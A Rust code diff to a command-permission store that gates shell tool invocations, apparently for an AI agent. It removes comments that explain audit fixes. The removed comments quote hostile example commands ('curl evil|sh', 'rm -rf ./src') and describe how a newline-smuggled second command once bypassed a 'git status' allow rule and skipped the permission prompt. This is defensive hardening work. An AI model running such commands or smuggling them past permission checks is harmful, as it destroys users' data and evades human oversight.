@@ -4,7 +4,6 @@ use std::collections::HashSet;
 use std::path::{Path, PathBuf};
 use std::sync::{LazyLock, Mutex};
 
-// AUDIT-FIX: C-2 — token-prefix match prevents `git status; curl evil|sh` slipping past a `git status` allow.
 fn token_prefix_matches(entry: &str, candidate_tokens: &[&str]) -> bool {
     let entry_tokens: Vec<&str> = entry.split_whitespace().collect();
     if entry_tokens.is_empty() || candidate_tokens.len() < entry_tokens.len() {
@@ -138,8 +137,6 @@ pub struct PermissionStore {
     #[serde(default)]
     pub workspace_rules: Vec<PermissionRule>,
 
-    /// Ring buffer of the last 50 tool invocations that were denied during the
-    /// current or past sessions. Not persisted — session-only.
     #[serde(skip)]
     pub recently_denied: Vec<String>,
 }
@@ -181,11 +178,6 @@ impl PermissionStore {
     /// Returns Some(true) if allowed, Some(false) if denied, None if no match.
     #[allow(dead_code)]
     pub fn check(&self, command: &str) -> Option<bool> {
-        // `split_whitespace` eats newlines, so `git status\nrm -rf ./src`
-        // tokenized to [git, status, rm, -rf, ./src] and prefix-matched a
-        // stored `git status` rule with no metachar in any trailing token —
-        // the prompt was skipped and sh -c ran both lines. A stored rule can
-        // never span lines, so a multi-line command has no stored decision.
         if command.contains('\n') || command.contains('\r') {
             return None;
         }
